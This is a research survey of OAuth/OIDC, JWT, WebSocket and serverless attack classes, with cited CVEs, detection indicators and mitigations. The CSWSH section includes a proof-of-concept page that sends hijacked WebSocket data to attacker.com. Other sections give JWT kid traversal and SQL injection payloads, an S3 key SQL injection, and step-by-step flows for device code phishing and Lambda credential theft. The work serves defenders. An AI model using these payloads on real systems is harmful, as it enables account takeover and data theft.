# Advanced API Attack Vectors: OAuth 2.0/OIDC, WebSocket, and Serverless (2023-2026)

## Device Authorization Grant Abuse (Device Code Phishing)

### Takeaway
Device code phishing has escalated from a niche red-team technique to a widespread attack vector, with both state-aligned and financially motivated threat groups abusing the OAuth 2.0 Device Authorization Grant flow primarily against Microsoft 365, using ready-made toolkits such as SquarePhish2, Graphish, and Kali365.

### Cited Findings
- Proofpoint reports that by September 2025, device code phishing shifted from limited red-team and targeted activity to widespread campaigns, with both state-aligned and financially motivated actors involved. Lures typically claim to involve document sharing, token reauthorization, or security verification, and are delivered via buttons, hyperlinked text, or QR codes. Growth is linked to ready-made phishing tools such as SquarePhish2 and Graphish. -- [Proofpoint](https://www.proofpoint.com/us/blog/threat-insight/access-granted-phishing-device-code-authorization-account-takeover)
- AppOmni documented a vishing (voice phishing) campaign targeting Salesforce users, in which victims were socially engineered to enter a device code on Salesforce's connect page. Salesforce subsequently removed the OAuth device flow in September 2025. AppOmni notes the attack applies anywhere the OAuth 2.0 device flow is implemented, including GitHub, Google Cloud, and Okta. -- [AppOmni](https://appomni.com/blog/device-code-phishing-saas/)
- A secondary report states that the EvilTokens phishing-as-a-service (PhaaS) platform hit over 340 Microsoft 365 organizations by March 2025, and that the FBI issued a PSA in May 2025 about the Kali365 kit. -- [CyberPress](https://cyberpress.org/oauth-device-code-phishing-attacks/) (unverified against primary FBI source)
- Kaspersky recommends disabling the device code flow via Entra ID Conditional Access policies where it is not needed, and monitoring DeviceCodeSignIn events for anomalous sign-ins. -- [Kaspersky/Securelist](https://securelist.com/microsoft-device-code-phishing-attack/120350/)

**Attack Flow (reconstructed from multiple sources):**
1. Attacker initiates a device authorization request to the target IdP's `/devicecode` endpoint, receiving a `device_code` and `user_code`.
2. Attacker sends the `user_code` to the victim via phishing email, Teams message, or voice call, directing them to the legitimate verification URL (e.g., `microsoft.com/devicelogin`).
3. Victim navigates to the real IdP page and enters the code -- no fake login page is involved.
4. Attacker polls the IdP's `/token` endpoint using the `device_code` until the victim completes authentication.
5. IdP returns access and refresh tokens to the attacker, granting persistent access.

**Detection indicators:**
- Unusual `DeviceCodeSignIn` events in Entra ID audit logs.
- Token acquisition from IP addresses or geolocations inconsistent with the user's history.
- High-frequency polling against the `/token` endpoint from a single IP.

### Inferences
- The attack is effective precisely because the victim interacts with the legitimate IdP -- there is no phishing page to detect via URL inspection or domain reputation.
- Organizations that do not need device code flow for IoT/smart TV use cases should disable it entirely via Conditional Access.
- The removal of device flow by Salesforce suggests vendors are beginning to treat the feature as a liability.

### Gaps
- The FBI PSA about Kali365 could not be verified from a primary government source.
- No detailed technical analysis of the EvilTokens platform was found.
- Polling manipulation techniques (e.g., accelerating the polling interval or race conditions in code acceptance) were not described in any source found.

---

## Pushed Authorization Requests (PAR) Bypass Attacks

### Takeaway
No published research, CVE, or disclosed bug bounty report describing a PAR-specific bypass attack was found in the 2023-2026 timeframe. PAR (RFC 9126) remains a defensive mechanism, and its security benefits are well-documented, but offensive research targeting it appears sparse or nonexistent in public sources.

### Cited Findings
- RFC 9700 (OAuth Security BCP) recommends PAR to prevent authorization request manipulation, since parameters are transmitted directly to the authorization server rather than through the browser. -- [RFC 9700](https://www.rfc-editor.org/info/rfc9700/)
- No search results addressed PAR bypass techniques specifically. PAR appeared only as a recommended mitigation in OAuth security guidance.

### Inferences
- Theoretical PAR bypass vectors would include: (a) an authorization server that accepts both PAR and traditional authorization requests, allowing an attacker to bypass PAR by using the traditional endpoint; (b) request_uri prediction or replay if the PAR endpoint returns predictable URIs; (c) race conditions between PAR request creation and authorization request consumption.
- The absence of published attacks may reflect PAR's relatively recent adoption (RFC 9126 was published in September 2021) and the fact that many deployments do not yet enforce PAR-only mode.

### Gaps
- No CVEs, bug bounty reports, or academic papers describing PAR bypass attacks were found.
- Whether any major IdP enforces PAR-only mode and has been tested for fallback bypass is unknown from public sources.

---

## DPoP (Demonstration of Proof-of-Possession) Token Attacks

### Takeaway
No published attack against DPoP (RFC 9449) was found. DPoP appears only as a defensive recommendation in the literature, binding tokens to the client's key pair. Offensive research on DPoP downgrade or bypass is absent from public sources in 2023-2026.

### Cited Findings
- DPoP is described as a sender-constraining mechanism that OAuth 2.1 encourages, binding tokens to the requesting device's cryptographic key pair. -- [APISec](https://www.apisec.ai/blog/oauth-2-0-common-security-flaws)
- RFC 9700 recommends sender-constrained tokens (via mTLS or DPoP) to mitigate token theft and replay. -- [RFC 9700](https://www.rfc-editor.org/info/rfc9700/)

### Inferences
- Theoretical DPoP attack vectors would include: (a) DPoP downgrade -- if the resource server accepts both DPoP-bound and bearer tokens, an attacker who steals a token can strip the DPoP proof and present it as a plain bearer token; (b) DPoP proof replay within the time window if the server's nonce/jti tracking is insufficient; (c) weak key generation in the client's DPoP key pair.
- The downgrade scenario is analogous to the PKCE downgrade pattern and is the most likely real-world risk.

### Gaps
- No CVEs, disclosed reports, or proof-of-concept attacks targeting DPoP were found.
- Whether any authorization server accepts both DPoP-bound and plain bearer tokens (enabling downgrade) has not been publicly tested or reported.

---

## OAuth Token Exchange (RFC 8693) Exploitation

### Takeaway
RFC 8693 token exchange is designed for service-to-service delegation, but its security depends heavily on implementation choices around which token types are accepted as inputs, whether refresh tokens are issued in exchange responses, and how revocation propagates across exchanged tokens. No specific exploit or CVE targeting token exchange was found.

### Cited Findings
- RFC 8693 states that the exchange is a one-time event and does not create a tight linkage between input and output tokens. A refresh token in the response is optional and typically not issued when exchanging temporary credentials. -- [RFC 8693](https://www.rfc-editor.org/info/rfc8693/)
- Zitadel allows all token types except refresh tokens as subject tokens in exchange requests. -- [Zitadel Docs](https://zitadel.com/docs/guides/integrate/token-exchange)
- Authlete validates that refresh-token inputs were issued by its own server, are unexpired, and belong to the requesting service. -- [Authlete Docs](https://www.authlete.com/developers/token_exchange/)
- A 2026 arXiv paper (NEBULA) proposes extending refresh token rotation to revoke the entire rotation lineage upon replay detection, noting that RFC 9700's BCP does not require lineage-wide revocation. -- [arXiv NEBULA](https://arxiv.org/pdf/2608.04115)

### Inferences
- The primary risk is privilege escalation through exchange: a service with a narrow-scope token exchanges it for a broader-scope token if the authorization server does not enforce scope reduction.
- If exchanged tokens can produce refresh tokens that are not part of the original rotation family, revocation of the source token would not reach the exchanged refresh token, creating a persistence mechanism.
- Impersonation via token exchange (requesting a token "on behalf of" another user) is dangerous if the authorization server does not verify that the requesting service has delegation rights for that user.

### Gaps
- No published exploit, CVE, or bug bounty report targeting RFC 8693 token exchange was found.
- Whether any real-world authorization server issues refresh tokens via exchange that escape the source token's revocation scope is not documented in public sources.
- Silent authentication abuse was not covered in any source found.

---

## PKCE Downgrade Attacks

### Takeaway
PKCE downgrade is a well-documented and actively exploited attack class where the attacker strips the `code_challenge` from the authorization request, and the authorization server -- treating PKCE as optional -- issues a code without verifier binding, nullifying the protection against authorization code interception. Multiple real-world CVEs exist.

### Cited Findings
- **CVE-2025-4144** (Cloudflare `workers-oauth-provider` < 0.0.5, published May 1, 2025): PKCE checks could be caused to be skipped by an attacker. Severity rated moderate (CVSS v4: 5.3). CWE-287 (Improper Authentication). Fixed in version 0.0.5. This was notable because it affected the MCP (Model Context Protocol) framework's OAuth implementation. -- [GitHub Advisory GHSA-qgp8-v765-qxx9](https://github.com/cloudflare/workers-oauth-provider/security/advisories/GHSA-qgp8-v765-qxx9)
- **CVE-2023-48228 and CVE-2024-23647** (authentik): The authorization server accepted PKCE in one request and its absence in the next, enabling downgrade. -- [DEV Community](https://dev.to/roxdavirox/pkce-downgrade-attack-when-the-authorization-server-accepts-both-flows-199m)
- RFC 9700 mandates that authorization servers MUST reject a token request containing a `code_verifier` if there was no `code_challenge` in the original authorization request, and vice versa. -- [RFC 9700](https://www.rfc-editor.org/info/rfc9700/)

**Attack Steps:**
1. Attacker intercepts or initiates an authorization request.
2. Attacker strips `code_challenge` and `code_challenge_method` from the request parameters.
3. Authorization server (if it treats PKCE as optional) issues an authorization code without binding it to a verifier.
4. Attacker intercepts the authorization code (via redirect URI manipulation, open redirect, or referrer leakage).
5. Attacker exchanges the code for tokens at the token endpoint without needing a `code_verifier`.

**Detection:**
- Monitor authorization requests for the absence of `code_challenge` when the client is registered to use PKCE.
- Log and alert on token requests where `code_verifier` is missing for clients that previously used PKCE.
- The OAuch testing tool (oauch.io) includes a specific test for this downgrade scenario.

### Inferences
- The CVE-2025-4144 case in Cloudflare's MCP OAuth provider is particularly significant because MCP servers are a rapidly growing attack surface as AI tool-use expands.
- OAuth 2.1 makes PKCE mandatory for all clients, eliminating the downgrade path -- but adoption of 2.1 is not universal.

### Gaps
- The exact mechanism by which CVE-2025-4144 allowed the PKCE check to be skipped was not detailed in the advisory; the fix is in PR #27 of the repository.

---

## JWT Algorithm Confusion and Key Reference Injection Attacks

### Takeaway
JWT key reference injection -- via the `kid`, `jku`, `x5u`, and `jwk` header parameters -- is a well-established attack class that continues to produce bounties and CVEs. The core issue is that the attacker can influence which verification key the server uses, and many libraries do not enforce server-side key allowlists by default.

### Cited Findings

**kid (Key ID) Attacks:**
- **Directory traversal:** When `kid` feeds a filesystem lookup, a value like `../../dev/null` makes the server read an empty file and verify against an empty secret. The attacker signs the token with an empty string as the HMAC key. -- [DEV Community (kid attacks)](https://dev.to/roxdavirox/jwt-kid-parameter-attacks-sql-injection-and-path-traversal-via-key-id-5607)
- **SQL injection:** The attacker injects `' UNION SELECT 'attacker_secret' -- ` into the `kid` field, causing the database query to return the attacker's chosen key material. This exposes CWE-89 in a JWT context. -- [DEV Community (kid attacks)](https://dev.to/roxdavirox/jwt-kid-parameter-attacks-sql-injection-and-path-traversal-via-key-id-5607)

**jku (JWK Set URL) Spoofing:**
- The attacker sets the `jku` header to point to their own server hosting a JWK Set. The server fetches the attacker's public key and uses it for verification. The attacker signs the token with their own private key. Works when the server does not validate the `jku` URL against an allowlist. -- [DEV Community (key reference injection)](https://dev.to/roxdavirox/jwt-key-reference-injection-the-attack-class-that-wins-bounties-while-guides-miss-it-421)
- **CVE-2026-48522** (reported affecting PyJWT's `PyJWKClient`): The client does not validate the URL scheme in the `jku` parameter, accepting `file://`, `ftp://`, and `data:` URIs. -- [DEV Community](https://dev.to/roxdavirox/jwt-key-reference-injection-the-attack-class-that-wins-bounties-while-guides-miss-it-421) (unverified against NVD; the CVE ID has a 2026 date)

**x5u (X.509 URL) Abuse:**
- Functions identically to `jku` spoofing but uses an X.509 certificate chain URL. The attacker hosts a self-signed certificate at their URL, and the server fetches and trusts it for verification. -- [DEV Community (key reference injection)](https://dev.to/roxdavirox/jwt-key-reference-injection-the-attack-class-that-wins-bounties-while-guides-miss-it-421)

**jwk (Embedded Key) Injection:**
- The attacker embeds their own public key directly in the JWT header's `jwk` field. If the server uses this embedded key for verification (rather than looking up the key from its own store), the attacker can sign any token. -- [IntelligenceX Blog](https://blog.intelligencex.org/jwt-vulnerabilities-testing-guide-2025-algorithm-confusion)
- **CVE-2018-0114** (node-jose < 0.11.0, CVSS 8.1): The library trusted the JWK embedded in the token header for verification. -- [DEV Community](https://dev.to/roxdavirox/jwt-key-reference-injection-the-attack-class-that-wins-bounties-while-guides-miss-it-421)

**Algorithm Confusion (RS256 to HS256):**
- The attacker changes the `alg` header from RS256 to HS256. If the server uses the RSA public key as the HMAC secret (because the code path selects the key based on the algorithm), the attacker can sign tokens using the publicly available RSA public key. -- [JSMon Blog](https://blogs.jsmon.sh/jwt-algorithm-confusion-to-account-takeover-rs256-hs256-jku-injection-kid-sqli/)

**Mitigations:**
- Maintain a server-side allowlist of JWKS URIs. Ignore `jwk`, `jku`, and `x5u` parameters in untrusted tokens before verification.
- Treat `kid` as an opaque identifier mapped through a whitelist to actual keys. Never use `kid` in filesystem paths or SQL queries without validation.
- Explicitly configure the expected algorithm and reject tokens with mismatched `alg` headers.

### Inferences
- The `kid` parameter is the most dangerous because it bridges JWT verification into injection-vulnerability territory (SQLi, path traversal, command injection) depending on implementation.
- Libraries that auto-discover keys from token headers remain the primary enabler of these attacks.

### Gaps
- CVE-2026-48522 (PyJWT) and CVE-2024-21643 could not be verified against NVD. They appear only in blog posts.
- CVE-2025-30204 (golang-jwt, CVSS 7.5) was mentioned but describes excessive memory allocation, not key injection.

---

## Cross-Site WebSocket Hijacking (CSWSH)

### Takeaway
CSWSH remains a viable and underappreciated attack vector in 2024-2025 because WebSocket connections are not covered by the Same-Origin Policy, most WebSocket frameworks leave Origin validation disabled by default, and SameSite cookie protections have edge cases that permit bypass. Real CVEs continue to emerge in production software.

### Cited Findings
- **Core mechanism:** A malicious page can open a WebSocket connection to a victim's application, and the browser attaches the victim's cookies. The attack requires: (a) cookie-based authentication, (b) the authentication cookie set to `SameSite=None` or exploiting SameSite edge cases, and (c) a WebSocket server that does not validate the `Origin` header during the handshake. -- [Include Security (2025)](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- **SameSite bypass:** Chrome defaults cookies without explicit SameSite to Lax since 2020. However, Lax has a two-minute grace period after cookie issuance during which cookies are sent with cross-site top-level POST requests. Additionally, `SameSite=Lax` only blocks cross-site requests, not same-site requests from sibling subdomains. -- [Dozzle Advisory](https://github.com/amir20/dozzle/security/advisories/GHSA-j643-x8pv-8m67)
- **CVE-2024-26135** (MeshCentral): CSWSH on an admin endpoint allowed leaking configuration data and generating login tokens. -- [GitHub Advisory](https://github.com/advisories/GHSA-cp68-qrhr-g9h8)
- **CVE-2024-51775** (Apache Zeppelin 0.11.1): Any remote attacker with network access could read paragraph content from authenticated sessions via CSWSH.
- **Mailpit Advisory (GHSA-524m-q5m7-79mm):** The `CheckOrigin` function was set to always return true, enabling CSWSH for unauthenticated access to message data. -- [Mailpit Advisory](https://github.com/axllent/mailpit/security/advisories/GHSA-524m-q5m7-79mm)
- **Framework defaults:** A DEV Community analysis claims four of five dominant WebSocket frameworks leave Origin validation disabled by default, making applications vulnerable out of the box. -- [DEV Community](https://dev.to/rxkov/cswsh-four-major-websocket-frameworks-default-to-vulnerable-while-attackers-get-a-bidirectional-hj8)

**Reproduction Steps:**
1. Identify the WebSocket endpoint (look for `101 Switching Protocols` in browser dev tools or proxy).
2. Confirm that authentication relies on cookies (check if the handshake sends session cookies).
3. Test Origin validation: send a WebSocket upgrade request with `Origin: https://attacker.com`. If the server responds with `101`, Origin validation is absent.
4. Create a malicious HTML page:
```html
<script>
var ws = new WebSocket("wss://vulnerable-app.com/ws");
ws.onopen = function() {
    ws.send('{"action":"get_sensitive_data"}');
};
ws.onmessage = function(event) {
    fetch("https://attacker.com/exfil?data=" + encodeURIComponent(event.data));
};
</script>
```
5. Host this page and lure an authenticated user to visit it. The browser sends the victim's cookies with the WebSocket handshake.

**Detection:**
- Monitor for WebSocket handshakes where the `Origin` header does not match expected application domains.
- Alert on `CheckOrigin` configurations that return true unconditionally.
- Review WebSocket middleware for missing Origin validation.

### Inferences
- The "default insecure" posture of WebSocket frameworks is analogous to the CORS misconfiguration problem and is likely the single largest contributor to CSWSH prevalence.
- Same-site subdomain attacks (a compromised or XSS-vulnerable sibling subdomain initiating CSWSH) are an underexplored vector that SameSite=Lax does not mitigate.

### Gaps
- The specific four frameworks claimed to be vulnerable by default were not individually identified or verified.
- No large-scale study quantifying CSWSH prevalence across production applications was found.

---

## WebSocket Message Injection, State Confusion, and Race Conditions

### Takeaway
WebSocket message-layer attacks are injection-class vulnerabilities (SQLi, XSS, command injection via WebSocket messages) combined with protocol-specific issues like state confusion from parser bugs and handshake smuggling. WebSocket-specific race conditions are not well-documented as a distinct attack class.

### Cited Findings
- **Message injection:** OWASP's WebSocket Security Cheat Sheet notes that WebSocket messages can carry injection payloads (SQL injection, XSS, command injection) and recommends treating all messages as untrusted, validating against schemas, and applying output encoding. -- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- **State confusion via parser bug (CVE-2026-54466, websocket-driver via SockJS):** An indefinite run of high-bit bytes pushes the length counter past JavaScript's double-precision integer range, causing the parser to read the next payload at the wrong offset. This results in message-boundary confusion -- the connection stays open but subsequent messages are misinterpreted. Fixed in websocket-driver 0.7.5. -- [GitHub Issue](https://github.com/smogon/pokemon-showdown/issues/12268)
- **Handshake smuggling (Netty):** The lax V07/V08 handshaker accepts a `Sec-WebSocket-Version: 7` request without the `Connection`/`Upgrade` headers, enabling an upgrade that proxies do not recognize -- enabling HTTP request smuggling and protocol-confusion attacks. -- [CVE-2026-47072](https://nvd.nist.gov/vuln/detail/CVE-2026-47072)
- **Header injection (hackney):** Untrusted input reaching the WebSocket handshake options allows injecting arbitrary HTTP headers into the outbound upgrade request. -- [Chainguard Advisory](https://images.chainguard.dev/security/GHSA-4mp9-239f-g9hg)

### Inferences
- WebSocket "race conditions" in the traditional sense (TOCTOU on shared state) are possible when multiple WebSocket messages arrive concurrently and the server processes them without proper synchronization, but this is an application-level concurrency bug rather than a protocol-level vulnerability.
- The parser-level state confusion in websocket-driver (CVE-2026-54466) is more dangerous than a typical DoS because it silently corrupts message boundaries, potentially causing authorization messages to be misrouted.

### Gaps
- No published research specifically on "WebSocket race conditions" as a named attack class was found.
- Socket.IO-specific authorization bypass via state confusion was not documented in any source found.
- WebSocket tunneling as an attack technique (using WebSocket connections to tunnel through firewalls/proxies) was not covered in any primary source.

---

## Socket.IO and SockJS Specific Vulnerabilities

### Takeaway
Socket.IO has had multiple denial-of-service CVEs in 2024-2026, primarily around uncaught exceptions and unbounded binary attachment buffering. SockJS has a reachable parser bug via the websocket-driver dependency. Neither has a published authorization bypass or data-exfiltration CVE.

### Cited Findings
- **CVE-2024-38355** (Socket.IO): A specially crafted packet triggers an uncaught exception on the server, killing the Node.js process. Fixed in socket.io 4.6.2. -- [Vicarius](https://www.vicarius.io/vsociety/posts/unhandled-exception-in-socketio-cve-2024-38355-exploit)
- **CVE-2026-33151** (Socket.IO): Before versions 3.3.5, 3.4.4, and 4.2.6, a crafted packet makes the server wait for many binary attachments and buffer them, causing memory exhaustion.
- **CVE-2026-69185** (Socket.IO): Describes the same binary-attachment buffering pattern; the parser did not validate the attachment count against a sane upper bound. May overlap with CVE-2026-33151. -- [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-69185/)
- **CVE-2026-54466** (websocket-driver, reachable via SockJS): Parser state confusion from integer overflow on the message length counter. -- [GitHub Issue](https://github.com/smogon/pokemon-showdown/issues/12268)

### Inferences
- The pattern across Socket.IO CVEs is server-side resource exhaustion from malformed packets, not data theft. However, a process crash (CVE-2024-38355) can be chained with race conditions during restart to bypass initialization-time security checks.

### Gaps
- No Socket.IO authorization bypass CVE was found.
- Socket.IO namespace/room isolation bypass has not been publicly documented as a vulnerability.

---

## WebSocket Protocol Downgrade and Tunneling

### Takeaway
WebSocket protocol downgrade attacks are primarily a concern when applications fall back from `wss://` to `ws://` (plaintext) or when proxies fail to recognize WebSocket upgrades, enabling smuggling. "WebSocket tunneling" as a named offensive technique for bypassing firewalls is discussed in security tooling contexts but lacks formal research publications.

### Cited Findings
- **Plaintext fallback:** Applications that accept `ws://` (unencrypted WebSocket) over public networks are vulnerable to MITM attacks that can read and modify all messages. Attackers can force downgrade by interfering with TLS negotiation. -- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- **Proxy smuggling (Netty, CVE-2026-47072):** The lax handshaker accepts WebSocket upgrades without required headers, creating a discrepancy between what the proxy sees (a normal HTTP request) and what the backend processes (a WebSocket connection). This enables request smuggling through reverse proxies. -- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-47072)
- OWASP recommends enforcing `wss://` only, validating the `Origin` header, and implementing per-message authentication tokens rather than relying solely on the initial handshake. -- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)

### Inferences
- The proxy-smuggling vector (Netty) is the most practically dangerous form of WebSocket "downgrade" because it subverts security controls at the infrastructure layer.
- WebSocket tunneling tools (e.g., wstunnel) exist for legitimate use but can be repurposed to bypass egress filtering by encapsulating arbitrary TCP traffic in WebSocket frames.

### Gaps
- No formal academic or industry research paper on "WebSocket tunneling attacks" as an offensive technique was found.
- Whether CDNs or WAFs can reliably inspect and block malicious WebSocket traffic after the upgrade is not well-documented.

---

## Serverless Event Injection Attacks

### Takeaway
Event injection is the signature serverless vulnerability: untrusted data from HTTP, S3, SNS, SQS, DynamoDB Streams, and other event sources reaches Lambda function code without validation because developers often treat the event payload as trusted "internal" data. This leads to traditional injection vulnerabilities (SQLi, command injection, SSRF) but triggered through non-HTTP channels.

### Cited Findings
- Event injection is described as the primary serverless attack vector: untrusted data from many event sources reaches a sink without validation, and non-HTTP triggers are usually trusted blindly by developers. -- [JSMon Blog](https://blogs.jsmon.sh/aws-lambda-security-exploiting-event-injection-and-credential-theft/)
- Blueinfy documented blind Lambda event injection techniques without outbound connections, using side-channel methods (timing, error messages) to exfiltrate data when the function has no internet access. -- [Blueinfy](https://blog.blueinfy.com/2018/10/blind-lambda-event-injections-without_24.html)
- Strobes describes a penetration testing methodology for serverless functions that includes testing S3 event triggers (crafting object keys containing injection payloads), SNS/SQS message injection, and DynamoDB Streams poisoning. -- [Strobes](https://strobes.co/blog/serverless-architecture-penetration-testing/)

**Event Injection Attack Vectors by Trigger Type:**
- **API Gateway:** Standard HTTP injection (SQLi, XSS, command injection) via query parameters, headers, and body. The event object passes these through without sanitization.
- **S3 Trigger:** Object keys can contain injection payloads (e.g., an S3 key like `'; DROP TABLE users; --` triggers a function that uses the key in a SQL query).
- **SNS/SQS:** Message bodies are attacker-controlled when the topic/queue accepts external publishers. The function processes the message body as trusted input.
- **DynamoDB Streams:** If an attacker can write to the DynamoDB table (e.g., via another compromised function), they can inject payloads that trigger downstream functions.
- **CloudWatch Events/EventBridge:** Custom event patterns can be injected if the event bus accepts events from untrusted sources.

### Inferences
- The multi-trigger nature of serverless functions dramatically expands the injection surface compared to traditional web applications that only handle HTTP.
- S3 key injection is particularly insidious because object keys are often logged, searched, or used in database queries without escaping.

### Gaps
- No 2024-2025 CVE specifically targeting serverless event injection was found. The technique is well-known but produces application-level bugs rather than platform CVEs.
- Quantified prevalence data (e.g., percentage of Lambda functions vulnerable to event injection) was not found.

---

## Serverless SSRF and Credential Theft

### Takeaway
Lambda functions do not use the EC2 metadata service (169.254.169.254). Instead, IAM role credentials are injected directly as environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`). SSRF attacks against Lambda therefore target environment variable exposure rather than metadata endpoint access, making them distinct from EC2 SSRF.

### Cited Findings
- Resecurity documents that SSRF against AWS infrastructure typically targets the metadata endpoint at 169.254.169.254 to steal temporary IAM credentials. IMDSv2 mitigates this by requiring a session token obtained via a PUT request, which simple SSRF cannot produce. -- [Resecurity](https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials)
- One write-up on SSRF escalation involving a Lambda backend notes that credentials are injected directly in Python's `os.environ`, which limits what a plain SSRF can read (the metadata endpoint is not available). -- [Medium/Poka](https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6)
- DarkReading describes attacking an AWS account via a Lambda function by leveraging the function's execution role credentials (available as environment variables) to escalate privileges within the AWS account. -- [DarkReading](https://www.darkreading.com/cloud-security/securing-serverless-attacking-an-aws-account-via-a-lambda-function)

**Lambda-Specific SSRF Chain:**
1. Find an SSRF vulnerability in the Lambda function (e.g., a URL parameter that the function fetches).
2. Unlike EC2, the Lambda execution environment does not expose `169.254.169.254`. Instead, credentials are in environment variables.
3. If the SSRF can be escalated to arbitrary code execution (e.g., via SSRF to an internal service that processes the response unsafely), the attacker reads `os.environ` to extract `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`.
4. Alternatively, if the function logs or reflects environment variables, the attacker can extract them through response data.
5. Stolen credentials can then be used from the attacker's machine to make AWS API calls with the function's IAM role permissions.

**Azure Functions and GCP Cloud Functions Differences:**
- Azure Functions: Credentials are stored in environment variables and app settings. The metadata endpoint at `169.254.169.254` is accessible and uses IMDSv1-style requests (no token required), making managed identity tokens accessible via SSRF.
- GCP Cloud Functions: The metadata endpoint at `169.254.169.254` is accessible with the header `Metadata-Flavor: Google`. If the SSRF allows setting custom headers, the attacker can retrieve the service account token.

### Inferences
- Lambda's lack of a metadata endpoint means SSRF-to-credential-theft requires a more complex chain (either code execution or environment variable leakage through application logic).
- The most direct Lambda credential theft vector is not SSRF but rather command injection or code injection that allows reading `process.env` or `os.environ`.
- Over-permissive Lambda execution roles are the main amplifier of credential theft impact.

### Gaps
- No 2024-2025 CVE specifically targeting Lambda SSRF was found.
- Detailed exploitation of Azure Functions or GCP Cloud Functions metadata endpoints via SSRF was not found in the search results.

---

## Environment Variable Leakage and /tmp Persistence in Serverless

### Takeaway
Lambda environment variables contain IAM credentials and often application secrets. The `/tmp` directory persists across warm invocations of the same container, enabling data persistence between function calls and potential cross-tenant data leakage if functions are reused.

### Cited Findings
- Lambda execution role credentials are injected as environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`). Additional secrets stored in environment variables (API keys, database passwords) are accessible to any code running in the function, including injected payloads. -- [DarkReading](https://www.darkreading.com/cloud-security/securing-serverless-attacking-an-aws-account-via-a-lambda-function)
- Strobes notes that serverless functions should be tested for environment variable exposure through error messages, debug endpoints, and injection vulnerabilities that reflect the runtime environment. -- [Strobes](https://strobes.co/blog/serverless-architecture-penetration-testing/)

**/tmp Persistence Attack:**
1. The `/tmp` directory in Lambda has 512MB of storage (configurable up to 10GB) and persists across warm invocations of the same container instance.
2. An attacker who achieves code execution can write a payload (e.g., a reverse shell script, a data exfiltration tool, or a cryptominer) to `/tmp`.
3. On subsequent warm invocations, the payload persists and can be re-executed, even if the original injection vector is patched, as long as the same container is reused.
4. The attacker can also read files left in `/tmp` by previous invocations, potentially accessing data from other users' requests processed by the same container.

**Mitigations:**
- Use AWS Secrets Manager or SSM Parameter Store instead of environment variables for secrets.
- Clear `/tmp` at the start of each function invocation for sensitive workloads.
- Set function concurrency to 1 to prevent concurrent access to shared `/tmp` state.
- Use Lambda ephemeral storage encryption (enabled by default).

### Inferences
- The `/tmp` persistence vector is most dangerous in multi-tenant serverless applications where different users' requests may be processed by the same warm container.
- Environment variable leakage through error responses is the most common real-world exposure path, particularly in development/staging functions deployed with verbose logging.

### Gaps
- No CVE specifically targeting `/tmp` persistence in Lambda was found. This is an architectural characteristic, not a platform bug.
- Whether cross-account container reuse has ever occurred in production AWS Lambda was not documented.

---

## Lambda Function URL Authorization Bypass

### Takeaway
Lambda function URLs are a convenience feature that exposes functions directly over HTTPS without API Gateway. They support two auth types (`AWS_IAM` and `NONE`), and the `NONE` type makes the function publicly accessible with no authentication whatsoever. Discovery of these URLs is possible through passive DNS data.

### Cited Findings
- Wiz reports that attackers can find Lambda function URLs through passive DNS data matching the regex pattern `*.lambda-url.*.on.aws`, and through development artifacts (e.g., source code, CI/CD configurations). Lambda function URLs do not provide built-in protection mechanisms like throttling or WAF integration. -- [Wiz](https://www.wiz.io/blog/securing-aws-lambda-function-urls)
- Setting concurrency limits too low eases denial-of-service attacks, whereas setting them too high enables denial-of-wallet attacks. -- [Wiz](https://www.wiz.io/blog/securing-aws-lambda-function-urls)
- Lambda URLs lack the security features of API Gateway, including request validation, rate limiting, API keys, and WAF integration. Placing CloudFront, API Gateway, or AWS WAF in front of Lambda URLs is recommended. -- [EndlessQueue](https://endlessqueue.com/posts/2/)

### Inferences
- The `AUTH_TYPE=NONE` setting on Lambda function URLs is the serverless equivalent of an open API endpoint with no authentication. It is the simplest "authorization bypass" because there is nothing to bypass.
- Even with `AUTH_TYPE=AWS_IAM`, misconfigured resource policies (e.g., `Principal: *`) can effectively make the function public.

### Gaps
- No CVE targeting Lambda function URL IAM auth bypass was found.
- Whether the IAM auth mechanism for function URLs has been tested for signature bypass or replay attacks is not documented in public sources.

---

## Serverless Denial of Wallet (DoW)

### Takeaway
Denial-of-wallet attacks exploit the pay-per-use billing model of serverless platforms by triggering excessive function invocations, memory usage, or execution time, causing the target to incur unexpected cloud costs. Real-world DoW attack reports are scarce, but academic simulations demonstrate cost amplification from low-rate traffic.

### Cited Findings
- An arXiv comprehensive review (2025) notes that detailed reports of real-world DoW attacks are scarce, and that academic simulations show hundreds or thousands of dollars in additional billing from low-rate function invocations. -- [arXiv](https://arxiv.org/html/2508.19284v1)
- DoW attacks target the billing model rather than availability. Unlike traditional DoS, the goal is financial damage, not service disruption. The function continues to operate normally while costs escalate. -- [Medium](https://medium.com/@2pairhitch/denial-of-wallet-dow-attack-30cc2affe64d)
- Lambda function URLs without rate limiting are particularly vulnerable because there is no built-in throttling mechanism. -- [Wiz](https://www.wiz.io/blog/securing-aws-lambda-function-urls)

**DoW Attack Techniques:**
1. **Direct invocation flooding:** Send high volumes of requests to a publicly accessible Lambda function URL or API Gateway endpoint.
2. **Payload inflation:** Send requests with large payloads that maximize execution time and memory usage (e.g., triggering expensive computations or large file processing).
3. **Recursive trigger chains:** Trigger a function that writes to S3, which triggers another function, which writes to DynamoDB, which triggers another function -- creating an amplification loop.
4. **Sleep-based cost amplification:** If the function can be made to wait (e.g., via SSRF to a slow-responding server), the execution time (and cost) increases with minimal attacker bandwidth.
5. **Concurrent invocation saturation:** Trigger maximum concurrent invocations to maximize per-second billing.

**Mitigations:**
- Set reserved concurrency limits on Lambda functions.
- Configure AWS Budgets with alerts and automated actions (e.g., removing Lambda permissions when a threshold is reached).
- Use API Gateway with throttling and usage plans in front of Lambda.
